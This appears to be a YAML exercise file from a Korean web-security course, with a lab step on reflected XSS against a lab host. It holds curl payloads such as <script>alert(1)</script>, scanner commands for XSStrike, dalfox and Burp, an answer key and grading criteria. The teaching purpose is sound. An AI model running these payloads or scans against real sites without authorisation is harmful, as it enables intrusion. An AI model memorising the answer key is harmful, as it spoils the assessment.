lab_id: web-vuln-nonai-week03
title: XSS(Cross-Site Scripting) 실습
version: non-ai
course: web-vuln-nonai
week: 3
description: 반사형, 저장형, DOM 기반 XSS 공격의 원리와 방어 기법을 실습합니다.
difficulty: medium
duration_minutes: 120
objectives:
- 반사형/저장형/DOM XSS를 구분한다
- XSS 페이로드를 작성하고 테스트한다
- CSP 등 방어 기법을 이해한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: |-
    대상 웹 애플리케이션(http://{{WEB_IP}})의 검색 기능에서 반사형 XSS를 테스트하시오.

    ■ 실습 방법 (4 도구로 Reflected XSS)

    ▶ 1단계: 도구 A — curl 수동 페이로드 (응답 반사 확인)
    ```bash
    PAYLOAD='<script>alert(1)</script>'
    ENCODED=$(printf '%s' "$PAYLOAD" | jq -sRr @uri)
    curl -s "http://10.20.30.80/#/search?q=$ENCODED" | grep -oE '<script>[^<]*</script>' | head -3
    echo "반사형 XSS 테스트 완료"
    ```
    응답 본문에 `<script>alert(1)</script>` 가 그대로 보이면 → 인코딩 안된 reflection = XSS 취약.

    ▶ 2단계: 도구 B — XSStrike (가장 종합 XSS scanner)
    설치 (이미 ~/XSStrike): `python3 ~/XSStrike/xsstrike.py`. 사용:
    ```bash
    cd ~/XSStrike
    python3 xsstrike.py -u "http://10.20.30.80/#/search?q=test" --params --crawl
    # --params: 파라미터 자동 fuzz
    # --crawl: 사이트 크롤링 후 발견된 모든 entry 점검
    ```
    출력 예 (취약 시):
    ```
    [+] Vulnerable webpage: http://10.20.30.80/#/search
    [+] Vector for q: <SvG/onLoaD=confirm(1)>
    [+] Efficiency: 100
    [+] Confidence: 10
    ```

    ▶ 3단계: 도구 C — dalfox (Go 기반, 빠름)
    설치: `sudo apt install dalfox` 또는 `go install github.com/hahwul/dalfox/v2@latest`. 사용:
    ```bash
    dalfox url "http://10.20.30.80/#/search?q=test" --mining-dom --mining-dict
    # 자동 파라미터 발견 + DOM XSS + 사전 기반 페이로드
    # 또는 STDIN 으로 다수 URL
    cat urls.txt | dalfox pipe
    ```

    ▶ 4단계: 도구 D — Burp Suite Active Scan (GUI, 가장 정밀)
    1. Burp Proxy → Intercept → /search?q=test 요청 캡처
    2. 우클릭 → **Send to Active Scan**
    3. Issue 패널에서 "Cross-site scripting (reflected)" 확인
    4. 우클릭 → **Show response in browser** 으로 시각 검증

    ▶ 5단계: 답변
    각 도구 출력 (XSStrike "Vulnerable webpage" / dalfox "[POC] ..." / Burp "Reflected XSS" 등) 1줄 quote + payload + reflection 위치.
  hint: 'curl 수동 / XSStrike --crawl 종합 / dalfox 빠름 / Burp Active Scan GUI.'
  category: xss_reflected
  points: 8
  answer: curl -s 'http://10.20.30.80/#/search?q=<script>alert(1)</script>' 2>/dev/null
    | head -20 && echo '반사형 XSS 테스트 완료'
  answer_detail: 반사형 XSS는 사용자 입력이 즉시 응답에 반영될 때 발생합니다.
  verify:
    type: output_contains
    expect: 반사형 XSS 테스트 완료
    field: stdout
    semantic:
      intent: 반사형 XSS — curl 'http://10.20.30.80/#/search?q=<script>alert(1)</script>'.
        사용자 입력 즉시 응답 반영. OWASP A03 + CWE-79. URL 파라미터 + script 태그.
      success_criteria:
      - 반사형 XSS 키워드
      - <script> 페이로드
      - /search?q=
      acceptable_methods:
      - URL 파라미터 + script
      - Burp Repeater
      - OWASP ZAP scan
      negative_signs:
